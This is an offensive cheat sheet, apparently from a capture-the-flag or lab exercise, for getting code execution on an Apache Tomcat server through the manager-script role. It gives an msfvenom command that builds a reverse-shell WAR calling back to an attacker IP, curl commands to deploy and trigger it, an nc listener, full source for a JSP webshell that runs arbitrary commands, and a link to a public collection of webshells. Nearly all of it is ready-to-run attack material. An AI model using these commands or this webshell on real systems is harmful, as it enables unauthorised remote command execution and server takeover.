# Tomcat

## Using manager-script role

Since our tomcat user only has the manager-script role, and not the usual manager-gui role, we can only use the tomcat /manager/text/... scripting api. First, create a reverse shell WAR file:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.28 LPORT=1234 -f war > rev-shell.war
```

## Content of WAR file

```bash
jar -ft rev-shell.war
```

## Upload the WAR file

```bash
curl -v -u tomcat:$pass --upload-file pwn.war "http://x.x.x.x:8080/manager/text/deploy?path=/foo&update=true"
```

## Start listener and trigger

```bash
nc -lvp xxxx
```

```bash
curl https://x.x.x.x:8080/rev-shell/hfdoujdmnpzesrd.jsp
```

## Exploiting Manually - JSP Webshell

Create a webshell directory with index.jsp:

```bash
mkdir webshell
cd webshell
nano index.jsp
```

JSP web shell code:

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Package into WAR:

```bash
jar -cvf ../webshell.war *
```

Upload in the deploy functionality, then access index.jsp within the uploaded webshell directory.

## Alternative - Using cmd.jsp

Download webshell from: https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/jsp

```bash
zip -r revshell.war cmd.jsp
```

Upload and access: `http://target:8080/revshell/cmd.jsp`
